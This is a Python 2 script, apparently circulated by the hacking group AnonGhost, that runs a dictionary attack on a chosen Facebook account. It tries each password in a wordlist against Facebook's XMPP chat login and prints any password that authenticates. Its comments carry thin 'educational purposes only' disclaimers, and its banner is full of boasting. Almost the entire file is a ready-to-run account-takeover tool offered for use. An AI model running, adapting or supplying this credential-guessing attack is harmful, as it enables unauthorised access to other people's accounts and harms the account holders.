#!/usr/bin/python
#Install SleekXMPP & xmpppy Modules
#You are free to develop this script , if you want to add API module ^^
#Priv88888 and not for kidz -(18)
#This program is only for educational purposes only.
#Changing Description of this Script won't make you the coder ^_^ !
#Don't Attack people facebook account's it's illegal ! 
#If you want to HaCk into someone's account, you must have the permission of the user. 
#Mauritania Attacker is not responsible.
#usage:script.py username then type wordlist file

import xmpp
import sys
import urllib,re
import time
import random

print """
 
  ______ ____         _____                _            
 |  ____|  _ \       / ____|              | |            
 | |__  | |_) |_____| |     _ __ __ _  ___| | _____ _ __
 |  __| |  _ <______| |    | '__/ _` |/ __| |/ / _ \ '__|
 | |    | |_) |     | |____| | | (_| | (__|   <  __/ |  
 |_|    |____/       \_____|_|  \__,_|\___|_|\_\___|_|  
 
                # Private Ghost Password Priv8
                #We Still Da Kingz of Cyber Haterz \!/
                #Coded By Mauritania Attacker & X-Wanted
                #Greetz To All Members Of AnonGhost Team ;)
                #Enjoy Cracking ^__^
                #usage:script.py usernamefacebook then type wordlist file
                                                         
                                                    """    

login = raw_input("Enter Facebook Username : ")
password_list = raw_input("Enter the password file name: ")
password_list = open(password_list, "r")

login=login+"@chat.facebook.com"


print "@Connecting To Facebook Terminal Server... "
print "~~Connection Has Been Establishing Successfully To The Server~~"
print "Negotiating With The Protocol..."
print "There was no error with Port..."
print "\!/ You Are Successfully Connected Enj0y \!/..."
print "\!/ Attack Has Been Started Be Patient... \!/..."


for pwd in password_list:

	sys.stdout.write(".")
	sys.stdout.flush()

	pwd=pwd.strip('\n')

	jid = xmpp.protocol.JID(login)
	C  = xmpp.Client(jid.getDomain(), debug=[])
	
	
	if C.connect(('chat.facebook.com',5222)):
		print "~~Injecting Password~~"
		
	else:
		print "[+]Enj0y wkwkwkw[+]"

	print pwd

	if C.auth(jid.getNode(), pwd):
		C.sendInitPresence()
		print "Facebook Account Successfully Hacked  ^_* "," Password Found ==> : ",pwd
		print "GreetZ To AnonGhost Team \!/"
		print "Satya Enki wAs Here"

	C.disconnect()
	time.sleep(2)